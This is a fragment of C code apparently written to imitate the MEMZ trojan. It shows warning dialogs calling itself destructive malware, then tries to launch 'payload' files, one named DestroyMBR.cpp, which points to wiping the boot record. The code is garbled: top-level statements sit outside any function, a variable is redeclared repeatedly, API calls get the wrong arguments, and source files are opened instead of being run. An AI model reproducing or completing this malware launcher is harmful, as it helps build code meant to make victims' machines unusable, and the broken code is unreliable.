if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES ||
MessageBoxA(NULL, "THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR AND THE CODE I GOT IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
			ExitProcess(0);
		}
    int nRet= (int)ShellExecute( 0,"open","DrawErrors.c",0,0,SW_SHOWNORMAL);
if ( nRet <= 32 ) {
        DWORD dw= GetLastError(); 
        char szMsg[250];
        FormatMessage(
            FORMAT_MESSAGE_FROM_SYSTEM,	
            0, dw, 0,
            szMsg, sizeof(szMsg),
            NULL 
        );
        MessageBox( szMsg, "Error launching Payload1" );
        int nRet= (int)ShellExecute( 0,"open","Invert.c",0,0,SW_SHOWNORMAL);
if ( nRet <= 32 ) {
        DWORD dw= GetLastError(); 
        char szMsg[250];
        FormatMessage(
            FORMAT_MESSAGE_FROM_SYSTEM,	
            0, dw, 0,
            szMsg, sizeof(szMsg),
            NULL 
        );
        MessageBox( szMsg, "EEEEEEEEEEEEEEEEEEEEEEEEEEXXXXXXXXXXXXXXXXEEEEEEEEEEEEEEEEE" );
}
}
int nRet= (int)ShellExecute( 0,"open","RandomSites.c",0,0,SW_SHOWNORMAL);
if ( nRet <= 32 ) {
        DWORD dw= GetLastError(); 
        char szMsg[250];
        FormatMessage(
            FORMAT_MESSAGE_FROM_SYSTEM,	
            0, dw, 0,
            szMsg, sizeof(szMsg),
            NULL 
        );
        MessageBox( szMsg, "AGHHHHHHHHHHHHHHHHHHHHH" );
}
int nRet= (int)ShellExecute( 0,"open","DestroyMBR.cpp",0,0,SW_SHOWNORMAL);
if ( nRet <= 32 ) {
        DWORD dw= GetLastError(); 
        char szMsg[250];
        FormatMessage(
            FORMAT_MESSAGE_FROM_SYSTEM,	
            0, dw, 0,
            szMsg, sizeof(szMsg),
            NULL 
        );
        MessageBox( szMsg, "Error launching Calculator" );
}
